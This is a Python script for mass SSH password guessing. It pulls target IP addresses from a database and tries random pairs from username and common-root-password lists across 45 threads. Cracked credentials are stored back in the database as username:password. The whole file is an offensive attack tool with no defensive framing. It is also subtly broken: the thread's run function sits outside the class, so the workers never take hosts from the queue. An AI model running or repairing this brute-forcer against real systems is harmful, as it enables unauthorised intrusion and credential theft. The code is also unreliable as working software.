import os
import socket
import threading
import time
import traceback

from queue import Queue

import psycopg2
import paramiko
import random

from ddtrace import tracer
from dotenv import load_dotenv
import connection_param

conn = connection_param.conn
GREEN = connection_param.GREEN
RED = connection_param.RED
RESET = connection_param.RESET
YELLOW = connection_param.YELLOW
USERNAME_FILE = "usernames.txt"
PASSWORD_FILE = "common_root_passwords.txt"
MAX_RETRIES = 3
MAX_CONNECTIONS = 45

load_dotenv()

tracer.configure(hostname='172.28.0.5', port=8126)

class SSHConnectionThread(threading.Thread):
    """Thread class for establishing SSH connections."""

    def __init__(self, queue, username_file, password_file):
        """
        Initialize the SSHConnectionThread.

        Args:
            queue (Queue): A queue containing IP addresses to process.
            username_file (str): Path to the file containing usernames.
            password_file (str): Path to the file containing passwords.
        """
        threading.Thread.__init__(self)
        self.queue = queue
        self.usernames = self.read_file_lines(username_file)
        self.passwords = self.read_file_lines(password_file)

    def read_file_lines(self, file_path):
        """
        Read lines from a file and return as a list.

        Args:
            file_path (str): Path to the file.

        Returns:
            list: List of lines read from the file.
        """
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            lines = file.read().splitlines()
        return lines


def process_host(ip_address, usernames, passwords):
    """
    Process a host by attempting SSH connections with different credentials.

    Args:
        ip_address (str): The IP address of the host to process.
        usernames (list): A list of usernames to try for authentication.
        passwords (list): A list of passwords to try for authentication.
    """
    try:
        for _ in range(1000):
            username = random.choice(usernames)
            password = random.choice(passwords)
            retries = 0
            while retries < MAX_RETRIES:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                print(f"{GREEN}Trying {RESET}{username}/{password} {GREEN}as credentials on {RESET}{ip_address}")
                try:
                    client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
                    print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
                    cur = conn.cursor()
                    cur.execute("UPDATE hosts SET ssh_login = %s WHERE ip_address = %s", (f"{username}:{password}", str(ip_address)))
                    conn.commit()
                    break
                except paramiko.AuthenticationException:
                    # Incorrect credentials, continue to the next one
                    break
                except paramiko.SSHException:
                    print(f"{RED}Failed to connect to {RESET}{ip_address}")
                    break
                except socket.timeout:
                    print(f"{RED}Connection timed out for {RESET}{ip_address}")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError as caught_error:
                    print(f"{RED}Unable to connect to port 22 on {RESET}{ip_address}")
                    print(f"{RED}Error: {RESET}{str(caught_error)}")
                    break
                except (ConnectionResetError, paramiko.ssh_exception.SSHException) as caught_error:
                    print(f"{RED}Connection reset. Retrying...")
                    retries += 1
                    time.sleep(1)  # Wait for 1 second before retrying
                    continue
                except Exception as caught_error:
                    print(f"{RED}Error occurred: {RESET}{str(caught_error)}")
                    traceback.print_exc()
                    break
                finally:
                    client.close()
            if retries >= MAX_RETRIES:
                print(f"{YELLOW}Maximum retries reached. Moving to the next host.")
    except Exception as caught_error:
        print(f"{RED}Error occurred while processing {ip_address}: {str(caught_error)}")


def run(self):
    while True:
        # Get the IP address from the queue
        ip_address = self.queue.get()
        if ip_address is None:
            # Signal to stop the thread
            break
        try:
            process_host(ip_address, self.usernames, self.passwords)
        except Exception as caught_error:
            print(f"{RED}Error occurred while processing {ip_address}: {str(caught_error)}")
        self.queue.task_done()

def main(username_file, password_file):
    # Fetch the IP addresses from the database
    cur = conn.cursor()
    cur.execute("SELECT ip_address FROM hosts WHERE ip_address IS NOT NULL")
    ip_addresses = [row[0] for row in cur.fetchall()]
    # Create a queue to hold the IP addresses
    queue = Queue()
    for ip_address in ip_addresses:
        queue.put(ip_address)
    # Create and start the threads
    threads = []
    for _ in range(MAX_CONNECTIONS):
        thread = SSHConnectionThread(queue, username_file, password_file)
        thread.start()
        threads.append(thread)
    # Wait for all the tasks to complete
    queue.join()
    # Stop the threads
    for _ in range(MAX_CONNECTIONS):
        queue.put(None)
    for thread in threads:
        thread.join()

main(USERNAME_FILE, PASSWORD_FILE)
